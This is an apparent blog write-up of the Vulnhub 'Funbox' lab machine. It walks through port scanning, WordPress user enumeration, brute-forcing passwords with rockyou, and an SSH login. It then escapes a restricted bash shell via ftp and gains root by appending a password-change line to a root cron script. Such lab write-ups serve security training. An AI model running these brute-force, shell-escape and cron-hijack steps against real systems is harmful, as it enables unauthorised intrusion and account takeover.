@@ -1,0 +1,181 @@
+---
+title: Vulnhub - Funbox
+description: My writeup on Funbox box.
+categories:
+ - vulnhub
+tags: vulnhub wordpress rbash ssh cronjob wpscan pspy
+---
+
+![](https://i.imgur.com/FuewCDo.png)
+
+Hi all, let's start!
+
+You can find the machine there > [Funbox](https://www.vulnhub.com/entry/funbox-1,518/){:target="_blank"}
+
+## Enumeration/Reconnaissance
+
+Let's start always with nmap.
+
+```
+$ ip=192.168.1.10
+$ nmap -p- --min-rate 10000 $ip
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-02 13:27 EEST
+Nmap scan report for funbox.zte.com.cn (192.168.1.10)
+Host is up (0.00024s latency).
+Not shown: 65531 closed ports
+PORT      STATE SERVICE
+21/tcp    open  ftp
+22/tcp    open  ssh
+80/tcp    open  http
+33060/tcp open  mysqlx
+MAC Address: 08:00:27:87:6E:0C (Oracle VirtualBox virtual NIC)
+
+Nmap done: 1 IP address (1 host up) scanned in 2.51 seconds
+$ nmap -p 21,22,80,33060 -sC -sV -oN nmap/initial $ip
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-02 13:27 EEST
+Nmap scan report for funbox.zte.com.cn (192.168.1.10)
+Host is up (0.00042s latency).
+
+PORT      STATE SERVICE VERSION
+21/tcp    open  ftp     ProFTPD
+22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
+80/tcp    open  http    Apache httpd 2.4.41 ((Ubuntu))
+| http-robots.txt: 1 disallowed entry 
+|_/secret/
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+|_http-title: Did not follow redirect to http://funbox.fritz.box/
+|_https-redirect: ERROR: Script execution failed (use -d to debug)
+33060/tcp open  mysqlx?
+| fingerprint-strings: 
+|   DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp: 
+|     Invalid message"
+|_    HY000
+```
+
+Let's enumerate the port 80 first, when we visit it we get an error and redirect us to `http://funbox.fritz.box/` seems like  virtual host. We have to add it to `/etc/hosts` 
+
+```
+$ nano /etc/hosts
+...
+192.168.1.10    funbox.fritz.box
+```
+
+Now we can see a wordpress site, let's run `wpscan` on it.
+
+```
+$ wpscan --no-banner --url http://funbox.fritz.box/ -e ap,u
+...
+
+[+] Enumerating All Plugins (via Passive Methods)
+
+[i] No plugins Found.
+
+[+] Enumerating Users (via Passive and Aggressive Methods)
+ Brute Forcing Author IDs - Time: 00:00:00 <==========================================================================================================> (10 / 10) 100.00% Time: 00:00:00
+
+[i] User(s) Identified:
+
+[+] admin
+ | Found By: Author Posts - Author Pattern (Passive Detection)
+ | Confirmed By:
+ |  Rss Generator (Passive Detection)
+ |  Wp Json Api (Aggressive Detection)
+ |   - http://funbox.fritz.box/index.php/wp-json/wp/v2/users/?per_page=100&page=1
+ |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
+ |  Login Error Messages (Aggressive Detection)
+
+[+] joe
+ | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
+ | Confirmed By: Login Error Messages (Aggressive Detection)
+```
+
+No plugins but we can see 2 users `admin,joe` let's run a brute force attack on them with rockyou.
+
+```
+$ wpscan --no-banner --url http://funbox.fritz.box/ -U admin,joe -P /usr/share/wordlists/rockyou.txt 
+...
+
+[+] Performing password attack on Wp Login against 2 user/s
+[SUCCESS] - joe / 12345                                                                                                                                                                 
+[SUCCESS] - admin / iubire                                                                                                                                                              
+Trying admin / iubire Time: 00:00:09 <                                                                                                          > (670 / 14344394)  0.00%  ETA: ??:??:??
+
+[!] Valid Combinations Found:
+ | Username: joe, Password: 12345
+ | Username: admin, Password: iubire
+```
+
+Perfect, now we can use the same creds for ssh. `joe:12345` LOL.
+
+```
+$ ssh joe@$ip
+joe@192.168.1.10's password: 
+joe@funbox:~$ echo $SHELL
+/bin/rbash
+```
+
+We're in `rbash` we can simply bypass that.
+
+```
+joe@funbox:~$ ftp
+ftp> !/bin/bash
+```
+
+Under `/home/funny` i found a hidden backup.sh file that seems like a cronjob:
+
+```
+joe@funbox:/home/funny$ cat .backup.sh 
+#!/bin/bash
+tar -cf /home/funny/html.tar /var/www/html
+```
+
+Let's run [pspy](https://github.com/DominicBreuker/pspy){:target="_blank"} to confirm the cronjob.
+
+```
+joe@funbox:/tmp$ ./pspy64 -p -i 1000
+pspy - version: v1.2.0 - Commit SHA: 9c63e5d6c58f7bcdc235db663f5e3fe1c33b8855
+
+
+     ██▓███    ██████  ██▓███ ▓██   ██▓
+    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
+    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
+    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
+    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
+    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
+    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
+    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  
+                   ░           ░ ░     
+                               ░ ░     
+...
+
+2020/09/02 10:44:01 CMD: UID=1000 PID=3209   | /bin/bash /home/funny/.backup.sh 
+2020/09/02 10:44:01 CMD: UID=1000 PID=3208   | /bin/sh -c /home/funny/.backup.sh 
+2020/09/02 10:44:01 CMD: UID=1000 PID=3210   | tar -cf /home/funny/html.tar /var/www/html 
+
+2020/09/02 10:45:01 CMD: UID=0    PID=3217   | /bin/sh -c /home/funny/.backup.sh 
+2020/09/02 10:45:01 CMD: UID=0    PID=3219   | tar -cf /home/funny/html.tar /var/www/html 
+2020/09/02 10:45:01 CMD: UID=0    PID=3218   | /bin/bash /home/funny/.backup.sh 
+```
+
+We can see it runs as UID 1000 and as UID 0, let's add a command that changes root password and wait 5 minutes to be sure.
+
+```
+joe@funbox:/tmp$ nano /home/funny/.backup.sh 
+joe@funbox:/tmp$ cat /home/funny/.backup.sh 
+#!/bin/bash
+tar -cf /home/funny/html.tar /var/www/html
+echo 'root:pwned' | sudo chpasswd
+```
+
+And here we go:
+
+```
+joe@funbox:/tmp$ su - root
+Password: 
+root@funbox:~# whoami;id
+root
+uid=0(root) gid=0(root) groups=0(root)
+root@funbox:~# 
+```
+
+Was fun! :)
